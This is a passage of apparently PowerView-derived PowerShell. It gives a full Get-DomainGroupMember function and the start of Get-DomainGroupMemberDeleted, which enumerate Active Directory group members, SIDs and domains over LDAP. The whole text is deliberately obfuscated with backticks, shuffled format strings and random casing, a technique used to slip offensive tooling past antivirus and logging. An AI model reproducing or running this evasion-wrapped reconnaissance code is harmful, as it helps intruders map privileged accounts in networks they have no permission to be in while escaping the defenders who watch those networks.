function G`ET-D`omAI`NgRoup`M`em`BeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{0}{1}" -f 'uldProces','s','SSho','P'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{7}{6}{5}{0}{1}{3}{4}{2}"-f 'eTh','anAssig','ts','nm','en','edVarsMor','eclar','PSUseD'}, '')]
    [OutputType({"{1}{5}{2}{0}{3}{4}"-f 'upMe','PowerVie','o','mbe','r','w.Gr'})]
    [CmdletBinding(dEFAuLtPARaMeTErsEtnAME = {"{1}{0}"-f 'e','Non'})]
    Param(
        [Parameter(pOSITioN = 0, MandAtORY = ${tR`UE}, valuefroMPipeLINe = ${tR`UE}, vAlUefRoMPIpELiNebYpROpertYnaMe = ${tr`UE})]
        [Alias({"{0}{1}{3}{2}" -f 'Distingu','ishe','ame','dN'}, {"{0}{2}{1}{3}{4}"-f'SamA','c','c','ountNam','e'}, {"{1}{0}" -f'ame','N'}, {"{3}{0}{1}{4}{2}"-f'sting','u','hedName','MemberDi','is'}, {"{2}{1}{0}"-f 'me','Na','Member'})]
        [String[]]
        ${IdENT`i`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dom`AIN},

        [Parameter(PaRAmeteRSEtNAME = "MaNuaL`R`ecuRSE")]
        [Switch]
        ${R`ECUR`sE},

        [Parameter(PARAmeTErSEtname = "reCU`R`sEu`SinGMa`Tc`HIN`grULE")]
        [Switch]
        ${R`ECu`RSeuS`ING`MATC`H`IngRu`lE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'ter','Fil'})]
        [String]
        ${l`DaP`F`ILTEr},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f'DSPa','A','th'})]
        [String]
        ${sEAr`CH`BasE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{0}{1}" -f'tr','oller','Do','mainCon'})]
        [String]
        ${Serv`er},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{1}{0}{2}" -f'neL','O','evel'}, {"{1}{0}" -f 'ree','Subt'})]
        [String]
        ${se`A`R`CHscopE} = ("{1}{0}"-f'e','Subtre'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`sUlT`pAgES`IZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`ErVE`RTim`e`lIMit},

        [ValidateSet({"{1}{0}" -f 'acl','D'}, {"{1}{0}" -f'oup','Gr'}, {"{1}{0}" -f 'one','N'}, {"{1}{0}"-f 'er','Own'}, {"{0}{1}"-f 'S','acl'})]
        [String]
        ${S`EcurI`TYMAsKs},

        [Switch]
        ${t`oMBS`TO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`DenTI`AL} =   ( &("{0}{1}"-f'iT','eM') ('V'+'A'+'RIaBlE:J'+'h'+'3xO6') )."vAl`Ue"::"E`mPtY"
    )

    BEGIN {
        ${sEAR`cheraRg`U`mEN`TS} = @{
            ("{2}{1}{0}" -f 'ies','ropert','P') = ("{5}{6}{2}{4}{0}{7}{3}{1}" -f 'samacc','guishedname','mbe','untname,distin','r,','m','e','o')
        }
        if (${pSB`OunDpar`A`me`TERs}[("{1}{0}{2}" -f 'o','D','main')]) { ${SEA`RC`heRargu`M`e`NtS}[("{0}{1}{2}" -f 'D','oma','in')] = ${dOm`AIn} }
        if (${Ps`BOund`PARam`eTeRs}[("{1}{0}{2}" -f 'DAPF','L','ilter')]) { ${seaRcH`Era`Rg`UM`e`NTs}[("{3}{2}{1}{0}"-f'r','te','DAPFil','L')] = ${Ld`A`Pf`iLteR} }
        if (${psboUnD`Pa`RAM`E`TERs}[("{1}{0}{2}"-f'Bas','Search','e')]) { ${sea`RCher`ARgumE`Nts}[("{2}{1}{0}" -f 'ase','archB','Se')] = ${s`e`ArcHb`AsE} }
        if (${PSB`o`UNdpA`RAMEteRs}[("{0}{1}"-f'Ser','ver')]) { ${Se`ARCHE`RArg`UM`enTS}[("{1}{2}{0}"-f'r','S','erve')] = ${Se`R`VeR} }
        if (${PSBo`UN`DPa`RAMEters}[("{1}{3}{2}{0}"-f 'ope','Sear','hSc','c')]) { ${s`ea`RCHE`RarguM`E`Nts}[("{0}{2}{1}" -f'Sea','pe','rchSco')] = ${seARC`Hs`copE} }
        if (${Ps`BOUNDP`AraMe`TerS}[("{1}{0}{2}{3}" -f'esultPage','R','Si','ze')]) { ${sEAR`CHe`RAR`gumenTS}[("{3}{0}{2}{4}{1}" -f 'e','geSize','su','R','ltPa')] = ${reSU`lT`p`Age`SIze} }
        if (${PS`BouND`PAramEte`Rs}[("{2}{3}{1}{0}"-f't','imeLimi','Server','T')]) { ${se`A`RcHeRArg`U`MENtS}[("{2}{1}{3}{0}"-f 't','meLi','ServerTi','mi')] = ${s`eRVert`i`MeLI`miT} }
        if (${Ps`B`oUnDPArAMEt`ErS}[("{2}{0}{1}" -f'om','bstone','T')]) { ${Se`Ar`c`he`RA`RgUMeNTs}[("{2}{1}{0}"-f 'ne','bsto','Tom')] = ${t`o`mB`sToNe} }
        if (${p`S`B`oU`ND`paramEterS}[("{1}{0}{2}" -f'edent','Cr','ial')]) { ${SeA`R`ChEra`Rgume`N`Ts}[("{0}{1}{2}" -f 'Creden','t','ial')] = ${crE`D`ENt`ial} }

        ${AdNA`mE`Ar`G`UMENtS} = @{}
        if (${P`s`BOun`DparAmE`Te`RS}[("{0}{1}" -f'Do','main')]) { ${A`dNAMEAR`gU`MENtS}[("{2}{0}{1}"-f 'a','in','Dom')] = ${d`omA`In} }
        if (${Psbou`N`DPa`RAm`EteRs}[("{1}{0}"-f'r','Serve')]) { ${Adname`ARG`UmEN`Ts}[("{0}{1}{2}" -f'S','e','rver')] = ${Ser`Ver} }
        if (${PSboUNDp`ARa`m`Ete`RS}[("{1}{0}{2}"-f 'de','Cre','ntial')]) { ${A`dn`Am`E`ARGuM`eNtS}[("{2}{0}{1}" -f'reden','tial','C')] = ${crE`De`N`TiaL} }
    }

    PROCESS {
        ${GrOU`pS`ea`RcheR} = &("{3}{2}{5}{1}{4}{0}" -f 'er','nSea','et-Dom','G','rch','ai') @SearcherArguments
        if (${grOu`pSeA`R`ChER}) {
            if (${PsBOUnDP`A`R`A`MeTERS}[("{3}{4}{2}{0}{5}{1}"-f 'chi','ule','ingMat','Re','curseUs','ngR')]) {
                ${seA`R`CHerARgUMEn`Ts}[("{2}{1}{0}" -f 'y','ntit','Ide')] = ${IDe`N`TIty}
                ${S`eARCh`eRAr`g`U`MenTS}['Raw'] = ${t`RUe}
                ${gr`OuP} = &("{3}{0}{2}{1}{4}"-f'Domai','ro','nG','Get-','up') @SearcherArguments

                if (-not ${G`ROUp}) {
                    &("{2}{1}{0}{3}" -f 'e-Warnin','rit','W','g') ('[Ge'+'t-Dom'+'ain'+'G'+'roupMe'+'m'+'ber] '+'Erro'+'r '+'s'+'earch'+'ing'+' '+'f'+'or '+'gro'+'up '+'wi'+'th '+'identi'+'ty'+': '+"$Identity")
                }
                else {
                    ${GrOU`PFoUnDn`A`Me} = ${G`RO`Up}."Pr`oPert`ies".("{0}{1}"-f'it','em').Invoke(("{0}{2}{3}{1}"-f'samac','ame','count','n'))[0]
                    ${G`RouP`FOUN`DDN} = ${Gr`Oup}."Pr`Op`e`RTIES".("{0}{1}"-f 'i','tem').Invoke(("{4}{3}{2}{1}{0}" -f'dname','he','uis','sting','di'))[0]

                    if (${ps`BounD`P`ARAme`TErs}[("{1}{0}"-f 'n','Domai')]) {
                        ${GrOUP`FounDdO`m`A`in} = ${D`OmA`in}
                    }
                    else {
                        
                        if (${GrOUp`F`OU`N`dDN}) {
                            ${G`RoU`P`FOUNdD`om`Ain} = ${g`ROUp`FO`UNd`Dn}.("{0}{1}"-f 'S','ubString').Invoke(${G`R`oUPfouNDdn}.("{1}{2}{0}" -f'f','I','ndexO').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    &("{0}{2}{1}"-f'Write-V','se','erbo') ('[G'+'et'+'-Dom'+'ainGroupMember'+'] '+'Usin'+'g '+'LDAP'+' '+'m'+'atchin'+'g '+'rule'+' '+'to'+' '+'re'+'c'+'urse '+'on'+' '+"'$GroupFoundDN', "+'onl'+'y '+'use'+'r '+'a'+'cco'+'unts '+'wi'+'ll '+'be'+' '+'r'+'et'+'urned.')
                    ${gro`U`PsEARC`H`eR}."f`ilTer" = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    ${gr`OU`PSE`ArCheR}."PrO`perti`ES`Tolo`AD".("{1}{0}{2}"-f'dRa','Ad','nge').Invoke((("{0}{4}{1}{3}{2}"-f 'distinguis','d','me','Na','he')))
                    ${me`MBERS} = ${gR`OU`p`se`ArcHer}.("{0}{1}{2}"-f 'F','indA','ll').Invoke() | &("{2}{0}{1}"-f 'rEach-O','bject','Fo') {${_}."Pr`oPerTI`ES"."D`isTi`Ngu`iSHE`dna`ME"[0]}
                }
                ${nU`lL} = ${s`eArcHer`A`Rgu`MenTS}.("{1}{0}{2}" -f 'emo','R','ve').Invoke('Raw')
            }
            else {
                ${iDEN`TI`T`Y`FiLtEr} = ''
                ${fI`lTeR} = ''
                ${i`denT`ITY} | &("{2}{0}{1}" -f'here-Obje','ct','W') {${_}} | &("{2}{1}{0}" -f'h-Object','c','ForEa') {
                    ${iDentI`Ty`insTa`N`ce} = ${_}.("{0}{1}" -f'Repla','ce').Invoke('(', '\28').("{1}{0}{2}"-f'p','Re','lace').Invoke(')', '\29')
                    if (${ideN`T`it`Yin`StAnCe} -match ("{0}{1}" -f'^','S-1-')) {
                        ${idEnT`I`T`Yf`IlTEr} += "(objectsid=$IdentityInstance)"
                    }
                    elseif (${i`Den`T`ItyIn`s`TaNcE} -match ("{1}{0}"-f '=','^CN')) {
                        ${IDENt`ITyFi`l`TEr} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${p`sbO`UNdPA`RametERs}[("{1}{0}" -f'omain','D')]) -and (-not ${PSbO`U`N`DpA`RAMETERs}[("{2}{0}{1}"-f'c','hBase','Sear')])) {
                            
                            
                            ${I`dEnt`itYDOm`AIN} = ${ideNtItY`I`NstaN`ce}.("{1}{0}{2}"-f'ub','S','String').Invoke(${i`D`EnT`I`TYiNsT`AnCE}.("{0}{2}{1}"-f 'In','f','dexO').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{0}{1}{2}" -f 'Write-V','erbo','se') ('['+'G'+'et-'+'Domai'+'nGr'+'oupMe'+'mber]'+' '+'Ext'+'racte'+'d '+'d'+'o'+'main '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                            ${sEARc`HE`R`AR`G`UMENtS}[("{0}{1}" -f 'Doma','in')] = ${Ide`NtiT`YDoM`Ain}
                            ${Gro`UPs`e`A`RchEr} = &("{1}{2}{4}{3}{0}"-f'er','Ge','t-DomainS','h','earc') @SearcherArguments
                            if (-not ${GR`Ou`psEAR`ChEr}) {
                                &("{3}{0}{1}{2}" -f'te','-W','arning','Wri') ('[Get-'+'Do'+'mainGroupM'+'em'+'ber] '+'Unabl'+'e'+' '+'t'+'o '+'r'+'etrieve '+'do'+'main '+'se'+'ar'+'cher '+'f'+'or '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif (${IDe`NTI`T`YiNStAnCE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        ${GuI`Db`y`TeS`TRIng} = (([Guid]${iDENT`iTy`iNST`Ance}).("{1}{0}{2}"-f 'r','ToByteA','ray').Invoke() | &("{2}{4}{1}{3}{0}" -f 't','ch-Ob','ForE','jec','a') { '\' + ${_}.("{0}{1}{2}" -f 'T','oStrin','g').Invoke('X2') }) -join ''
                        ${ID`EntI`T`yfiLTer} += "(objectguid=$GuidByteString)"
                    }
                    elseif (${IdENTitYi`Ns`Tan`ce}.("{0}{1}" -f 'Cont','ains').Invoke('\')) {
                        ${Con`VeRTed`i`Dent`ItYIns`T`AN`CE} = ${i`DENTIT`yIN`StanCe}.("{0}{1}" -f 'Repl','ace').Invoke('\28', '(').("{0}{1}"-f 'Repl','ace').Invoke('\29', ')') | &("{1}{0}{2}{3}" -f'o','C','nvert-ADN','ame') -OutputType ("{3}{1}{0}{2}" -f'ni','o','cal','Can')
                        if (${COnv`E`RTEdIDenTItY`iNS`TancE}) {
                            ${gROuP`do`Ma`IN} = ${c`oNVertedidENtityInSt`A`N`Ce}.("{1}{0}{2}"-f 'n','SubStri','g').Invoke(0, ${CONvER`TEdIdE`N`T`IT`yIns`TaNcE}.("{2}{1}{0}" -f'xOf','de','In').Invoke('/'))
                            ${Gr`o`UPNaMe} = ${idenTi`T`YiNsTAN`Ce}.("{0}{1}" -f'Spl','it').Invoke('\')[1]
                            ${i`De`NTITyfIlt`eR} += "(samAccountName=$GroupName)"
                            ${seAR`cHerArGUm`E`NTs}[("{0}{1}"-f 'Dom','ain')] = ${g`RouPdO`M`AiN}
                            &("{0}{3}{1}{2}"-f 'W','erbos','e','rite-V') ('['+'Get-'+'Do'+'mainGro'+'upM'+'e'+'mber'+'] '+'Ex'+'tra'+'c'+'ted '+'do'+'main '+"'$GroupDomain' "+'fr'+'om '+"'$IdentityInstance'")
                            ${grOu`psE`ARcH`Er} = &("{4}{1}{0}{3}{5}{2}" -f'a','om','her','inS','Get-D','earc') @SearcherArguments
                        }
                    }
                    else {
                        ${IDeNTI`T`yFi`lter} += "(samAccountName=$IdentityInstance)"
                    }
                }

                if (${id`enTIt`YF`I`LteR} -and (${IdENtit`Yf`i`ltEr}.("{1}{0}" -f 'rim','T').Invoke() -ne '') ) {
                    ${FiLt`eR} += "(|$IdentityFilter)"
                }

                if (${P`sboU`NDpA`RAm`EtE`Rs}[("{0}{2}{1}"-f 'L','APFilter','D')]) {
                    &("{3}{2}{1}{0}"-f'e','s','ite-Verbo','Wr') ('[Ge'+'t-D'+'omai'+'nGroup'+'Memb'+'er] '+'Usi'+'ng '+'addi'+'tional'+' '+'LDAP'+' '+'fil'+'te'+'r: '+"$LDAPFilter")
                    ${f`IL`Ter} += "$LDAPFilter"
                }

                ${GrOu`pSEAr`CHEr}."f`ILTER" = "(&(objectCategory=group)$Filter)"
                &("{2}{0}{1}" -f'bo','se','Write-Ver') "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter) "
                try {
                    ${ReS`UlT} = ${g`RoUp`sEAR`CH`eR}.("{1}{0}" -f 'indOne','F').Invoke()
                }
                catch {
                    &("{1}{0}{3}{2}" -f'W','Write-','g','arnin') ('[Get-DomainGro'+'upM'+'e'+'mbe'+'r'+']'+' '+'Err'+'or'+' '+'se'+'arc'+'hing '+'fo'+'r '+'gr'+'o'+'up '+'wit'+'h '+'iden'+'ti'+'ty '+"'$Identity': "+"$_")
                    ${MemB`e`RS} = @()
                }

                ${G`ROupfOu`ND`N`AME} = ''
                ${GrOUP`FO`UnDDN} = ''

                if (${r`ES`UlT}) {
                    ${M`emBE`RS} = ${r`Es`ULT}."prOpe`Rt`Ies".("{1}{0}"-f'tem','i').Invoke(("{0}{1}{2}"-f'mem','b','er'))

                    if (${ME`mbe`RS}."CoU`Nt" -eq 0) {
                        
                        ${fi`N`ISH`ED} = ${FA`l`sE}
                        ${bo`Tt`Om} = 0
                        ${T`Op} = 0

                        while (-not ${Fi`NiSH`ED}) {
                            ${T`op} = ${BO`T`TOm} + 1499
                            ${MEm`Berran`ge}="member;range=$Bottom-$Top"
                            ${b`oT`TOm} += 1500
                            ${NU`lL} = ${gr`oUpS`E`ArcheR}."PrOPe`R`Ti`esTOL`OAD".("{0}{1}"-f'Cle','ar').Invoke()
                            ${n`UlL} = ${GRO`UPsEA`RcheR}."proPERtiE`sT`Ol`O`Ad".("{1}{0}" -f 'd','Ad').Invoke("$MemberRange")
                            ${nu`lL} = ${g`R`oUpseA`RchEr}."p`Rop`ErTIestO`lOad".("{0}{1}"-f 'Ad','d').Invoke(("{0}{2}{1}{3}"-f's','co','amac','untname'))
                            ${N`ULl} = ${GR`OuPSe`AR`cHEr}."PROPERT`I`es`TOlOad".("{1}{0}"-f 'd','Ad').Invoke(("{1}{4}{2}{5}{3}{0}" -f'me','distin','uis','edna','g','h'))

                            try {
                                ${r`EsuLT} = ${G`RO`UP`SearcHeR}.("{0}{1}" -f 'Find','One').Invoke()
                                ${rANgEdP`R`oP`e`RtY} = ${REs`ULT}."prOp`eRt`IEs"."prOpert`Yn`Am`es" -like ("{1}{0}{2}" -f'ge','member;ran','=*')
                                ${m`eMbe`RS} += ${R`EsuLT}."pRO`PER`TI`es".("{1}{0}" -f'em','it').Invoke(${ranGed`pr`o`per`Ty})
                                ${Gro`UpFo`UnDn`AME} = ${resU`lT}."p`RoPerT`Ies".("{0}{1}" -f'i','tem').Invoke(("{3}{1}{0}{2}"-f'count','mac','name','sa'))[0]
                                ${gro`U`P`F`OUNDdn} = ${r`Es`ULt}."P`RoPeRTi`ES".("{1}{0}"-f 'em','it').Invoke(("{0}{2}{1}{3}"-f 'dist','ished','ingu','name'))[0]

                                if (${mem`Be`RS}."c`oUnt" -eq 0) {
                                    ${f`InIs`heD} = ${Tr`UE}
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                ${F`InisH`Ed} = ${T`RuE}
                            }
                        }
                    }
                    else {
                        ${G`R`OupF`Ound`NaME} = ${rESu`Lt}."Pr`oPErtI`Es".("{0}{1}"-f'i','tem').Invoke(("{4}{0}{2}{1}{3}" -f 'a','a','ccountn','me','sam'))[0]
                        ${GrOUp`FO`UnDdn} = ${REs`U`lT}."p`R`oPErT`IEs".("{1}{0}"-f'tem','i').Invoke(("{0}{3}{1}{2}" -f'distingui','n','ame','shed'))[0]
                        ${m`E`MbErs} += ${r`ESUlt}."P`RopERTI`eS".("{0}{1}" -f 'i','tem').Invoke(${R`AnGeDpR`O`per`TY})
                    }

                    if (${p`s`BoUN`DpaRame`TE`Rs}[("{2}{0}{1}"-f'm','ain','Do')]) {
                        ${gRO`U`p`Fo`UNdDOm`AIN} = ${do`ma`In}
                    }
                    else {
                        
                        if (${g`ROupfOuND`DN}) {
                            ${GR`Ou`pfOUN`DDomaIn} = ${gr`OupFOu`NDDN}.("{1}{3}{2}{0}" -f 'ng','S','Stri','ub').Invoke(${GRO`UpfOun`D`dN}.("{1}{0}{2}"-f 'dexO','In','f').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach (${ME`MB`eR} in ${ME`m`BErS}) {
                if (${re`CuR`se} -and ${USEM`AtC`H`Ing`RuLe}) {
                    ${P`ROpeR`TiES} = ${_}."propeRt`i`Es"
                }
                else {
                    ${ob`Je`cTSe`ARc`hEr`ArGumEn`Ts} = ${SEA`R`CHE`RAr`G`UmEnTs}.("{0}{1}"-f'Cl','one').Invoke()
                    ${oB`jECT`S`EArc`h`erArguMents}[("{0}{2}{1}"-f'Ide','y','ntit')] = ${M`eM`BER}
                    ${oB`jEcT`sEA`RC`her`AR`Gu`MENTS}['Raw'] = ${TR`UE}
                    ${obJEcT`searC`h`erargUmEn`TS}[("{0}{2}{1}"-f'Pro','erties','p')] = ("{3}{9}{4}{11}{12}{2}{14}{1}{8}{6}{5}{13}{0}{10}{7}{15}"-f'jectsid,','m','name,','dist','is','am','countn','e','ac','ingu','obj','he','d','e,ob','cn,sa','ctclass')
                    ${Obj`ECt} = &("{4}{0}{1}{2}{3}"-f 'et','-Dom','ai','nObject','G') @ObjectSearcherArguments
                    ${PRo`peR`T`ieS} = ${OBJ`E`CT}."Pr`O`PerTi`eS"
                }

                if (${PRoPE`Rt`ies}) {
                    ${gR`oup`mem`BEr} = &("{2}{1}{0}" -f 'bject','O','New-') ("{2}{1}{0}" -f't','Objec','PS')
                    ${gr`oUPM`Em`BEr} | &("{0}{1}{2}"-f'A','dd-M','ember') ("{0}{1}{2}"-f 'Note','p','roperty') ("{1}{2}{0}" -f 'in','Gro','upDoma') ${gr`OuPfOU`NDdoMA`in}
                    ${gR`O`UPme`MBER} | &("{2}{1}{0}" -f 'mber','dd-Me','A') ("{1}{2}{0}"-f 'perty','Notepr','o') ("{1}{2}{0}" -f'e','G','roupNam') ${g`ROUPFOUn`Dn`AmE}
                    ${g`R`ouPMeMbeR} | &("{0}{2}{1}"-f 'Add-Me','er','mb') ("{3}{2}{0}{1}"-f'r','ty','pe','Notepro') ("{4}{2}{1}{0}{3}" -f'tinguishedN','s','oupDi','ame','Gr') ${GrO`UPFoUn`D`DN}

                    if (${pr`op`ERt`iEs}."ObJe`C`T`sID") {
                        ${Me`MbE`RsiD} = ((&("{2}{1}{0}"-f'ct','ew-Obje','N') ("{7}{0}{5}{9}{10}{3}{1}{13}{6}{8}{12}{4}{2}{11}"-f 'tem','ty.P','ti','i','rityIden','.','c','Sys','ipa','Sec','ur','fier','l.Secu','rin') ${Pr`o`Per`TIes}."OBjE`cTS`id"[0], 0)."Val`UE")
                    }
                    else {
                        ${MEm`BE`Rsid} = ${N`ULL}
                    }

                    try {
                        ${ME`mb`eRDn} = ${P`ROPEr`TI`Es}."diS`Ti`N`GuiSHedNa`me"[0]
                        if (${Mem`Ber`DN} -match ((("{6}{5}{4}{3}{7}{9}{8}{0}{2}{1}"-f 'JCS-','1','1-5-2','i','r','gnSecu','Forei','ty','incipalsn','Pr'))."REp`la`ce"(([cHar]110+[cHar]74+[cHar]67),'|'))) {
                            try {
                                if (-not ${M`E`M`BerSid}) {
                                    ${mE`MBE`RS`ID} = ${Prope`Rti`Es}."c`N"[0]
                                }
                                ${mEm`BE`RS`IM`pl`eNaMe} = &("{3}{1}{0}{2}" -f't-ADNa','r','me','Conve') -Identity ${M`emb`eRsId} -OutputType ("{1}{2}{0}"-f'imple','Domai','nS') @ADNameArguments

                                if (${meM`Be`R`sim`pLEn`AME}) {
                                    ${mE`MbErD`Om`AiN} = ${mEMbErSIm`pL`E`NA`mE}.("{0}{1}" -f 'Sp','lit').Invoke('@')[1]
                                }
                                else {
                                    &("{0}{1}{2}" -f'Write','-War','ning') ('[G'+'e'+'t'+'-Do'+'mainGroupM'+'ember]'+' '+'Er'+'ror '+'co'+'n'+'vertin'+'g '+"$MemberDN")
                                    ${M`E`mBe`RDOmAiN} = ${nu`lL}
                                }
                            }
                            catch {
                                &("{0}{2}{3}{1}"-f'Write','ng','-','Warni') ('[Get-Do'+'mainGro'+'u'+'pMem'+'be'+'r] '+'E'+'rr'+'or '+'conve'+'rt'+'ing '+"$MemberDN")
                                ${m`emBeR`DO`MAin} = ${N`ULl}
                            }
                        }
                        else {
                            
                            ${Me`MB`erdO`MAiN} = ${mEMB`E`RDn}.("{0}{1}{2}{3}" -f 'S','ubS','t','ring').Invoke(${mE`MB`erDn}.("{1}{2}{0}" -f 'Of','Ind','ex').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        ${meMB`e`RDn} = ${nu`ll}
                        ${ME`MB`erDOmaIn} = ${nU`ll}
                    }

                    if (${prop`e`RTIeS}."sAma`c`cOU`NTnaMe") {
                        
                        ${me`MbeRn`Ame} = ${pRO`pE`RT`IeS}."S`Am`AC`COUnt`NAmE"[0]
                    }
                    else {
                        
                        try {
                            ${mEM`BER`NA`Me} = &("{0}{3}{1}{2}" -f 'Con','From-SI','D','vert') -ObjectSID ${p`ROPErTI`ES}."cN"[0] @ADNameArguments
                        }
                        catch {
                            
                            ${m`emBEr`NAmE} = ${PRoPE`Rt`I`eS}."c`N"[0]
                        }
                    }

                    if (${proP`ErT`I`Es}."ObJe`CT`ClasS" -match ("{2}{0}{1}" -f'e','r','comput')) {
                        ${MEMbER`ObJEcT`cla`Ss} = ("{2}{1}{0}" -f 'r','e','comput')
                    }
                    elseif (${p`RoPe`RtIEs}."oBjE`Ct`C`LasS" -match ("{1}{0}"-f'up','gro')) {
                        ${M`e`mbE`R`obJeCTcLasS} = ("{0}{1}" -f'grou','p')
                    }
                    elseif (${pR`O`Perties}."OB`jECT`c`lAsS" -match ("{1}{0}" -f'r','use')) {
                        ${m`e`MberobjEC`T`cLASS} = ("{0}{1}"-f'us','er')
                    }
                    else {
                        ${meMB`erobJEct`Cl`Ass} = ${nU`lL}
                    }
                    ${GRoUPMeM`B`ER} | &("{2}{1}{0}"-f 'er','Memb','Add-') ("{0}{1}{2}{3}"-f'No','tep','rop','erty') ("{0}{2}{3}{1}" -f 'Mem','ain','ber','Dom') ${MeMB`eRd`oMa`IN}
                    ${g`R`ouPMeMBer} | &("{2}{1}{0}"-f'er','Memb','Add-') ("{0}{1}{2}"-f'Notep','ropert','y') ("{2}{0}{1}"-f'erNa','me','Memb') ${Me`MBer`NA`me}
                    ${gRou`Pm`emBeR} | &("{2}{0}{1}"-f'mb','er','Add-Me') ("{2}{1}{0}" -f 'roperty','ep','Not') ("{0}{2}{3}{1}{4}" -f 'Memb','edN','erD','istinguish','ame') ${Memb`E`Rdn}
                    ${gr`oUPmEMb`ER} | &("{2}{0}{3}{1}" -f 'd-','r','Ad','Membe') ("{0}{3}{1}{2}" -f 'N','roper','ty','otep') ("{4}{1}{3}{2}{5}{0}" -f 'lass','emberOb','e','j','M','ctC') ${MEMb`e`RO`BJEctcl`A`SS}
                    ${gR`Ou`PMember} | &("{2}{0}{1}" -f'd-M','ember','Ad') ("{2}{0}{1}"-f 'pro','perty','Note') ("{0}{2}{1}" -f 'M','D','emberSI') ${MeM`BE`RsiD}
                    ${g`RoUPmEM`BEr}."PsoBj`E`cT"."tY`p`ena`mes".("{1}{0}"-f'rt','Inse').Invoke(0, ("{1}{0}{2}{3}" -f'rVie','Powe','w.Group','Member'))
                    ${gRouPMEM`B`eR}

                    
                    if (${PsbO`UnDpaRA`M`E`TerS}[("{2}{0}{1}"-f'u','rse','Rec')] -and ${mEM`Be`RdN} -and (${me`MbE`RObjEC`T`clAss} -match ("{1}{0}"-f 'oup','gr'))) {
                        &("{0}{2}{1}" -f 'Writ','se','e-Verbo') ('[Get-D'+'om'+'ainGrou'+'p'+'M'+'embe'+'r'+'] '+'Manu'+'ally '+'r'+'ecu'+'rsing '+'on'+' '+'group:'+' '+"$MemberDN")
                        ${SeARCh`E`RaRGu`MeNts}[("{1}{0}"-f 'entity','Id')] = ${memB`er`dn}
                        ${N`ULL} = ${seAR`CHe`RARG`U`m`ENTs}.("{1}{0}{2}"-f'ov','Rem','e').Invoke(("{0}{1}{2}"-f'Pr','ope','rties'))
                        &("{2}{0}{3}{1}" -f'GroupM','er','Get-Domain','emb') @SearcherArguments
                    }
                }
            }
            ${gR`O`Up`s`earcHER}.("{1}{0}{2}"-f'o','disp','se').Invoke()
        }
    }
}


function Get`-dO`ma`inG`RO`U`Pm`eMBeRDeLe`TED {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{7}{8}{5}{1}{3}{6}{0}{4}" -f'ssig','dVarsMoreTh','PSU','a','nments','are','nA','seD','ecl'}, '')]
    [OutputType({"{2}{0}{4}{1}{3}{5}{6}" -f 'rV','Dom','Powe','ainGrou','iew.','pMemb','erDeleted'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSiTiOn = 0, vALuEFroMPipeLiNe = ${t`RuE}, VAluEFrOmpipElineBYProPErTynAMe = ${T`RuE})]
        [Alias({"{0}{4}{2}{1}{3}" -f'Distingu','Nam','d','e','ishe'}, {"{2}{0}{3}{1}"-f 'ccount','me','SamA','Na'}, {"{0}{1}"-f'Nam','e'}, {"{0}{3}{4}{1}{2}"-f 'Mem','st','inguishedName','berD','i'}, {"{1}{2}{0}{3}"-f 'erN','M','emb','ame'})]
        [String[]]
        ${iDe`NTi`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`Ma`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'er','Filt'})]
        [String]
        ${Ld`A`PfiLtEr},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'Path','ADS'})]
        [String]
        ${sEARc`hBA`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{3}{1}{4}" -f 'DomainCont','e','ro','ll','r'})]
        [String]
        ${s`E`RvER},

        [ValidateSet({"{1}{0}"-f 'e','Bas'}, {"{1}{2}{0}" -f 'l','One','Leve'}, {"{0}{2}{1}"-f 'Su','ree','bt'})]
        [String]
        ${s`eA`Rchs`CopE} = ("{1}{0}"-f 'btree','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`eSUL`Tpa`GeSI`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seR`VErtIm`eL`i`mit},

        [Switch]
        ${T`OmBS`TONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CredE`N`T`IaL} =  ( &("{1}{0}" -f'BLe','varIA')  ("JH"+"3x"+"O6") )."VAL`UE"::"Em`pTY",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${s`e`Arc`Her`ArGUmE`NtS} = @{
            ("{1}{0}{2}" -f 'erti','Prop','es')    =   ("{6}{5}{0}{4}{1}{2}{3}" -f'repl','e','metada','ta','valu','sds-','m'),("{5}{1}{0}{4}{2}{3}" -f 'i','ist','uis','hedname','ng','d')
            'Raw'           =   ${Tr`Ue}
            ("{0}{1}{2}" -f'LD','AP','Filter')    =   ("{1}{6}{4}{0}{3}{2}{5}" -f 'ectCateg','(o','ry=grou','o','j','p)','b')
        }
        if (${psb`ou`N`DP`ARAMEters}[("{2}{0}{1}" -f 'ai','n','Dom')]) { ${SeAr`c`HEr`A`R`gUmENTs}[("{0}{1}"-f 'Domai','n')] = ${d`om`Ain} }
